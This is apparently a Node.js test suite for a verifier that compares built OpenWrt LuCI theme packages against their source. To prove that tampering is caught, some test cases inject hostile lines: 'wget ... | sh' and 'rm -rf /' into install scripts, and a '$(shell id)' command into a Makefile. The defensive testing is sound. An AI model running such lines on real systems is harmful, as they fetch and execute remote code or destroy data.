'use strict';
const mkTmp = require('./tmpdir');
/* security-tests/verify_built_apk.js: its rules on a synthetic package, and
   a full check of dist/<release>/ when a build is there (skipped otherwise;
   dist/ is not committed). */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const ROOT = path.join(__dirname, '..');
const V = require('../security-tests/verify_built_apk.js');
const { findings } = require('../security-tests/check_private_addresses.js');

const MAKEFILE = `include $(TOPDIR)/rules.mk

PKG_NAME:=luci-theme-vantage
PKG_VERSION:=9.8.7
PKG_RELEASE:=3
PKG_LICENSE:=GPL-3.0-or-later

LUCI_DEPENDS:=+luci-base \\
	+rpcd
LUCI_MINIFY_CSS:=0

define Package/luci-theme-vantage/postrm
#!/bin/sh
[ -n "$\${IPKG_INSTROOT}" ] || uci -q delete luci.themes.Vantage
exit 0
endef

define Package/luci-theme-vantage/conffiles
/etc/config/vantage
endef

include $(TOPDIR)/feeds/luci/luci.mk
`;

const SRC = {
	'htdocs/luci-static/vantage/a.css': [ ':root { --x: 1; }\n', 0o644 ],
	'htdocs/luci-static/resources/x.js': [ '\'use strict\';\nreturn { a: 1 };\n', 0o644 ],
	'ucode/template/themes/vantage/header.ut': [ '<link rel="stylesheet" href="{{ media }}/a.css">\n<b>{# PKG_VERSION #}</b>\n', 0o644 ],
	'root/etc/uci-defaults/30_luci-theme-vantage': [ '#!/bin/sh\nexit 0\n', 0o755 ],
	'root/etc/config/vantage': [ 'config names names\n', 0o644 ],
};

function tmp() { return mkTmp('vantage-pkgtest-'); }

/* a source tree and the package that a correct build makes from it */
function fixture() {
	const src = tmp(), pkgRoot = tmp();
	const pdir = path.join(src, 'luci-theme-vantage');
	fs.mkdirSync(pdir);
	fs.writeFileSync(path.join(pdir, 'Makefile'), MAKEFILE);
	for (const [ rel, [ body, mode ] ] of Object.entries(SRC)) {
		fs.mkdirSync(path.dirname(path.join(pdir, rel)), { recursive: true });
		fs.writeFileSync(path.join(pdir, rel), body, { mode });
		fs.chmodSync(path.join(pdir, rel), mode);
	}
	const mk = V.parseMakefile(MAKEFILE, 'Makefile');
	const payload = V.sourcePayload(pdir);
	const entries = [], dirs = new Set([ '' ]);
	const put = (rel, body, mode) => {
		fs.mkdirSync(path.dirname(path.join(pkgRoot, rel)), { recursive: true });
		fs.writeFileSync(path.join(pkgRoot, rel), body);
		entries.push({ path: rel, dir: false, mode, user: 'root', group: 'root', extra: [] });
		for (let d = path.posix.dirname(rel); d !== '.'; d = path.posix.dirname(d)) dirs.add(d);
	};
	for (const [ rel, s ] of payload) {
		let body = fs.readFileSync(s.src, 'utf8');
		body = V.substituteVersion(body, rel, mk.version);
		put(rel, body, s.mode);
	}
	put('lib/apk/packages/luci-theme-vantage.list', [ ...payload.keys() ].map(p => '/' + p).sort().join('\n') + '\n', 0o644);
	put('lib/apk/packages/luci-theme-vantage.conffiles', '/etc/config/vantage\n', 0o644);
	const h = require('crypto').createHash('sha256').update(fs.readFileSync(path.join(pkgRoot, 'etc/config/vantage'))).digest('hex');
	put('lib/apk/packages/luci-theme-vantage.conffiles_static', `/etc/config/vantage ${h}\n`, 0o644);
	for (const d of dirs) entries.push({ path: d, dir: true, mode: 0o755, user: 'root', group: 'root', extra: [] });
	const pkg = {
		format: 'apk', errors: [], extraKeys: [], entries,
		info: { name: 'luci-theme-vantage', version: '9.8.7-r3', arch: 'noarch', license: 'GPL-3.0-or-later',
			depends: [ 'libc', 'luci-base', 'rpcd' ], provides: [ 'luci-theme-vantage-any' ] },
		scripts: V.expectedApkScripts(mk),
	};
	const ctx = { jsmin: null, jsminOn: false, identifiers: null, findings };
	const cleanup = () => { for (const d of [ src, pkgRoot ]) fs.rmSync(d, { recursive: true, force: true }); };
	return { src, pkgRoot, pkg, ctx, cleanup };
}

function errorsFor(mutate) {
	const f = fixture();
	try {
		mutate(f);
		return V.checkPackage(f.pkg, f.pkgRoot, f.src, f.ctx).errors;
	} finally { f.cleanup(); }
}

test('verify_built_apk: Makefile parsing and generated scripts', () => {
	const mk = V.parseMakefile(MAKEFILE, 'Makefile');
	assert.equal(mk.fullVersion, '9.8.7-r3');
	assert.deepEqual(mk.depends, [ 'luci-base', 'rpcd' ]);
	assert.deepEqual(mk.conffiles, [ '/etc/config/vantage' ]);
	const s = V.expectedApkScripts(mk);
	assert.deepEqual(Object.keys(s).sort(), [ 'post-deinstall', 'post-install', 'post-upgrade', 'pre-deinstall' ]);
	assert.equal(s['post-deinstall'], '#!/bin/sh\n[ -n "${IPKG_INSTROOT}" ] || uci -q delete luci.themes.Vantage\nexit 0\n');
	assert.ok(s['post-install'].endsWith(V.LUCI_POSTINST));
	assert.ok(s['post-upgrade'].startsWith('#!/bin/sh\nexport PKG_UPGRADE=1\n[ "${IPKG_NO_SCRIPT}"'));
	assert.throws(() => V.parseMakefile(MAKEFILE.replace('exit 0\nendef', 'exit $(X)\nendef'), 'M'), /make expansion/);
	assert.throws(() => V.parseMakefile(MAKEFILE.replace('+rpcd', '+PACKAGE_x:rpcd'), 'M'), /not a plain \+package/);
	for (const name of [ 'luci-theme-vantage', 'luci-app-vantage' ]) {
		const real = V.parseMakefile(fs.readFileSync(path.join(ROOT, name, 'Makefile'), 'utf8'), name);
		assert.equal(real.name, name);
		assert.ok(real.depends.includes('luci-base'));
	}
	assert.equal(V.substituteVersion('<script src="{{ resource }}/cbi.js"></script> "{{ media }}/x.svg"', 'a.ut', '1.2'),
		'<script src="{{ resource }}/cbi.js?v=1.2"></script> "{{ media }}/x.svg"');
	assert.equal(V.modeFromString('rwsr-xr-t'), 0o5755);
});

test('verify_built_apk: a correct package passes', () => {
	assert.deepEqual(errorsFor(() => {}), []);
});

test('verify_built_apk: rejects stray files, bad modes, metadata and script drift', () => {
	const cases = [
		[ f => { f.pkg.entries.push({ path: 'www/extra.js', dir: false, mode: 0o644, user: 'root', group: 'root', extra: [] });
			fs.writeFileSync(path.join(f.pkgRoot, 'www/extra.js'), '1'); }, /extra\.js: in the package but not in the source/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('a.css')).mode = 0o666; }, /world-writable/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('a.css')).mode = 0o4755; }, /setuid/ ],
		[ f => { f.pkg.entries.find(e => e.path.includes('uci-defaults/')).mode = 0o644; }, /30_luci-theme-vantage: mode 644, expected 755/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('a.css')).user = 'nobody'; }, /owner nobody/ ],
		[ f => { f.pkg.entries.push({ path: 'tmp', dir: true, mode: 0o755, user: 'root', group: 'root', extra: [] }); }, /\/tmp\/: unexpected directory/ ],
		[ f => { f.pkg.info.depends.push('wget'); }, /depends/ ],
		[ f => { f.pkg.info.arch = 'x86_64'; }, /arch x86_64/ ],
		[ f => { f.pkg.info.version = '9.8.6-r3'; }, /version 9\.8\.6-r3/ ],
		[ f => { f.pkg.info.triggers = [ '/etc' ]; }, /unexpected info field triggers/ ],
		[ f => { f.pkg.scripts['post-install'] += 'wget http://example.com/x | sh\n'; }, /script post-install differs/ ],
		[ f => { f.pkg.scripts['pre-install'] = '#!/bin/sh\n'; }, /unexpected script pre-install/ ],
		[ f => { fs.appendFileSync(path.join(f.pkgRoot, 'www/luci-static/vantage/a.css'), `/* ${[ 10, 1, 2, 3 ].join('.')} */`); }, /a\.css: content differs[\s\S]*private IPv4/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'www/luci-static/resources/x.js'), 'return {'); }, /does not parse/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'usr/share/ucode/luci/template/themes/vantage/header.ut'),
			'<link rel="stylesheet" href="{{ media }}/a.css">\n<b>9.8.7</b>\n'); }, /asset link without \?v=9\.8\.7/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'lib/apk/packages/luci-theme-vantage.conffiles'), '/etc/config/other\n'); }, /conffiles differs/ ],
	];
	for (const [ mutate, re ] of cases) {
		const errs = errorsFor(mutate);
		assert.match(errs.join('\n'), re, `expected ${re}, got: ${errs.join(' | ') || 'no errors'}`);
	}
});

/* ------------------------------------------------------- language packages */

const LANGS = V.parseLuciLanguages(fs.readFileSync(path.join(ROOT, 'dev', 'i18n', 'luci-languages.mk'), 'utf8'), 'luci-languages.mk');

test('verify_built_apk: luci.mk language table and package names', () => {
	assert.deepEqual(LANGS.get('zh_Hans'), { name: '简体中文 (Simplified Chinese)', lc: 'zh-cn' });
	assert.equal(LANGS.get('pt_BR').lc, 'pt-br');
	assert.equal(LANGS.get('nb_NO').lc, 'no');
	assert.equal(LANGS.get('de').lc, 'de');
	assert.ok(!LANGS.has('templates') && !LANGS.has('en'));
	assert.throws(() => V.parseLuciLanguages('LUCI_LANG.xx=A $(shell id)\n', 'M'), /does not model/);
	/* the real Makefiles: distinct basenames, language packages at the package version */
	const theme = V.parseMakefile(fs.readFileSync(path.join(ROOT, 'luci-theme-vantage', 'Makefile'), 'utf8'), 'theme');
	const app = V.parseMakefile(fs.readFileSync(path.join(ROOT, 'luci-app-vantage', 'Makefile'), 'utf8'), 'app');
	assert.equal(theme.basename, 'vantage-theme');
	assert.equal(app.basename, 'vantage');
	assert.equal(theme.poVersion, theme.fullVersion);
	assert.equal(app.poVersion, app.fullVersion);
	assert.equal(V.packageFileName('luci-i18n-vantage-zh-cn', '1.0.1-r2', 'apk'), 'luci-i18n-vantage-zh-cn-1.0.1-r2.apk');
	/* the source tree as committed: every language directory is a package */
	const defined = V.sourcePackages(ROOT, LANGS);
	for (const [ name, p ] of defined) if (p.kind === 'lang') assert.match(name, /^luci-i18n-vantage-(theme-)?[a-z0-9-]+$/);
});

/* po2lmo stand-in: the "compiled" catalogue is the .po itself, and a
   catalogue containing NOTRANSLATIONS compiles to nothing (as po2lmo does
   for one without entries) */
function fakePo2lmo(dir) {
	const f = path.join(dir, 'po2lmo');
	fs.writeFileSync(f, '#!/bin/sh\ngrep -q NOTRANSLATIONS "$1" && exit 0\ncat "$1" > "$2"\n', { mode: 0o755 });
	return f;
}

const PO = 'msgid ""\nmsgstr "Content-Type: text/plain; charset=UTF-8\\n"\n\nmsgid "Log out"\nmsgstr "Abmelden"\n';

/* a theme source tree with po/de/ and the language package a correct build makes */
function langFixture(mkText = MAKEFILE.replace('LUCI_MINIFY_CSS:=0', 'LUCI_MINIFY_CSS:=0\nLUCI_BASENAME:=vantage-theme\nPKG_PO_VERSION:=$(PKG_VERSION)-r$(PKG_RELEASE)')) {
	const src = tmp(), pkgRoot = tmp(), tools = tmp();
	const pdir = path.join(src, 'luci-theme-vantage');
	fs.mkdirSync(path.join(pdir, 'po', 'de'), { recursive: true });
	fs.mkdirSync(path.join(pdir, 'po', 'templates'));
	fs.writeFileSync(path.join(pdir, 'Makefile'), mkText);
	fs.writeFileSync(path.join(pdir, 'po', 'de', 'vantage-theme.po'), PO);
	fs.writeFileSync(path.join(pdir, 'po', 'templates', 'vantage-theme.pot'), 'msgid ""\nmsgstr ""\n');
	const name = 'luci-i18n-vantage-theme-de';
	const entries = [], dirs = new Set([ '' ]);
	const put = (rel, body, mode) => {
		fs.mkdirSync(path.dirname(path.join(pkgRoot, rel)), { recursive: true });
		fs.writeFileSync(path.join(pkgRoot, rel), body);
		entries.push({ path: rel, dir: false, mode, user: 'root', group: 'root', extra: [] });
		for (let d = path.posix.dirname(rel); d !== '.'; d = path.posix.dirname(d)) dirs.add(d);
	};
	put(`etc/uci-defaults/${name}`, "uci set luci.languages.de='Deutsch (German)'; uci commit luci\n", 0o644);
	put('usr/lib/lua/luci/i18n/vantage-theme.de.lmo', PO, 0o644);
	put(`lib/apk/packages/${name}.list`, `/etc/uci-defaults/${name}\n/usr/lib/lua/luci/i18n/vantage-theme.de.lmo\n`, 0o644);
	for (const d of dirs) entries.push({ path: d, dir: true, mode: 0o755, user: 'root', group: 'root', extra: [] });
	const pkg = {
		format: 'apk', errors: [], extraKeys: [], entries,
		info: { name, version: '9.8.7-r3', arch: 'noarch', license: 'GPL-3.0-or-later',
			description: 'Translation for luci-theme-vantage - Deutsch (German)',
			depends: [ 'libc', 'luci-theme-vantage' ], provides: [ `${name}-any` ] },
		scripts: V.expectedApkScripts({ name, script: {}, noDefaultPostinst: true }),
	};
	const ctx = { jsmin: null, jsminOn: false, identifiers: null, findings, langs: LANGS, po2lmo: fakePo2lmo(tools) };
	const cleanup = () => { for (const d of [ src, pkgRoot, tools ]) fs.rmSync(d, { recursive: true, force: true }); };
	return { src, pdir, pkgRoot, pkg, ctx, cleanup };
}

function langErrors(mutate, mkText) {
	const f = langFixture(mkText);
	try {
		mutate(f);
		return V.checkPackage(f.pkg, f.pkgRoot, f.src, f.ctx).errors;
	} finally { f.cleanup(); }
}

test('verify_built_apk: a correct language package passes', () => {
	assert.deepEqual(langErrors(() => {}), []);
	const s = V.expectedApkScripts({ name: 'luci-i18n-vantage-de', script: {}, noDefaultPostinst: true });
	assert.deepEqual(Object.keys(s).sort(), [ 'post-install', 'post-upgrade', 'pre-deinstall' ]);
	assert.ok(s['post-install'].endsWith('add_group_and_user\ndefault_postinst\n'));
});

test('verify_built_apk: rejects language packages that differ from luci.mk and po2lmo', () => {
	const lmo = 'usr/lib/lua/luci/i18n/vantage-theme.de.lmo';
	const cases = [
		[ f => { fs.appendFileSync(path.join(f.pkgRoot, lmo), 'x'); }, /vantage-theme\.de\.lmo: content differs from po2lmo/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'etc/uci-defaults/luci-i18n-vantage-theme-de'), 'wget http://example.com/x | sh\n'); },
			/luci-i18n-vantage-theme-de: content differs from the line luci\.mk writes/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('.lmo')).mode = 0o755; }, /mode 755, expected 644/ ],
		[ f => { f.pkg.entries.push({ path: 'usr/lib/lua/luci/i18n/base.de.lmo', dir: false, mode: 0o644, user: 'root', group: 'root', extra: [] }); },
			/base\.de\.lmo: in the package but not in the source/ ],
		[ f => { f.pkg.entries = f.pkg.entries.filter(e => !e.path.endsWith('.lmo')); }, /vantage-theme\.de\.lmo: missing from the package/ ],
		[ f => { fs.writeFileSync(path.join(f.pdir, 'po', 'de', 'vantage-theme.po'), PO + '#NOTRANSLATIONS\n'); }, /vantage-theme\.de\.lmo: in the package but not in the source/ ],
		[ f => { f.pkg.info.depends.push('luci-base'); }, /depends/ ],
		[ f => { f.pkg.info.version = '1.0.0-r1'; }, /version 1\.0\.0-r1, expected 9\.8\.7-r3/ ],
		[ f => { f.pkg.info.description = 'Translation'; }, /description/ ],
		[ f => { f.pkg.scripts['post-install'] += 'rm -rf /\n'; }, /script post-install differs/ ],
		[ f => { f.pkg.scripts['post-deinstall'] = '#!/bin/sh\n'; }, /unexpected script post-deinstall/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'etc/uci-defaults/luci-i18n-vantage-theme-de'), `uci set luci.languages.de='${[ 10, 1, 2, 3 ].join('.')}'\n`); },
			/private IPv4/ ],
	];
	for (const [ mutate, re ] of cases) {
		const errs = langErrors(mutate);
		assert.match(errs.join('\n'), re, `expected ${re}, got: ${errs.join(' | ') || 'no errors'}`);
	}
	/* a git-derived PKG_PO_VERSION cannot be checked */
	assert.match(langErrors(() => {}, MAKEFILE.replace('LUCI_MINIFY_CSS:=0', 'LUCI_MINIFY_CSS:=0\nLUCI_BASENAME:=vantage-theme')).join('\n'), /PKG_PO_VERSION is unset/);
	/* a name the source does not define (other basename, other language) */
	assert.match(langErrors(f => { f.pkg.info.name = 'luci-i18n-vantage-de'; }).join('\n'), /unexpected package name/);
	assert.match(langErrors(f => { f.pkg.info.name = 'luci-i18n-vantage-theme-fr'; }).join('\n'), /unexpected package name/);
	/* a po/ directory luci.mk would skip */
	assert.throws(() => langErrors(f => { fs.mkdirSync(path.join(f.pdir, 'po', 'en')); }), /po\/en: not a LuCI language directory/);
});

test('verify_built_apk: language packages of both packages must not share a catalogue file', () => {
	const src = tmp();
	try {
		for (const name of [ 'luci-theme-vantage', 'luci-app-vantage' ]) {
			fs.mkdirSync(path.join(src, name, 'po', 'de'), { recursive: true });
			fs.writeFileSync(path.join(src, name, 'Makefile'), MAKEFILE.replace('luci-theme-vantage', name).replace('Package/luci-theme-vantage/', `Package/${name}/`)
				.replace('Package/luci-theme-vantage/', `Package/${name}/`));
			fs.writeFileSync(path.join(src, name, 'po', 'de', 'vantage.po'), PO);
		}
		/* same default basename "vantage" for both */
		assert.throws(() => V.sourcePackages(src, LANGS), /defined twice|would be in both/);
	} finally { fs.rmSync(src, { recursive: true, force: true }); }
});

/* full check of what sdk-build.sh left in dist/ */
const DIST = path.join(ROOT, 'dist');
const builds = fs.existsSync(DIST)
	? fs.readdirSync(DIST).filter(d => /^\d+\.\d+\.\d+$/.test(d) && fs.existsSync(path.join(DIST, d, 'BUILDINFO')))
	: [];

if (!builds.length)
	test('verify_built_apk: dist/<release>/ packages', { skip: 'no dist/<release>/BUILDINFO; run dev/build/sdk-build.sh first' }, () => {});

for (const rel of builds) {
	const dir = path.join(DIST, rel);
	const rev = (fs.readFileSync(path.join(dir, 'BUILDINFO'), 'utf8').match(/^rev=([0-9a-f]{40})$/m) || [])[1];
	const known = rev && spawnSync('git', [ '-C', ROOT, 'cat-file', '-e', `${rev}^{commit}` ]).status === 0;
	const apk = process.env.VANTAGE_APK || path.join(DIST, '.tools', rel, 'apk');
	const needsApk = fs.readdirSync(dir).some(f => f.endsWith('.apk'));
	const skip = !known ? `built from ${rev || 'an unknown rev'}, not in this repository`
		: needsApk && !fs.existsSync(apk) ? 'no apk tool (set VANTAGE_APK or rebuild with sdk-build.sh)' : false;
	test(`verify_built_apk: dist/${rel}/ matches its source commit`, { skip }, () => {
		const r = spawnSync(process.execPath, [ path.join(ROOT, 'security-tests', 'verify_built_apk.js'), dir ], { cwd: ROOT, encoding: 'utf8' });
		assert.equal(r.status, 0, r.stdout + r.stderr);
		assert.match(r.stdout, /all packages verified/);
	});
}
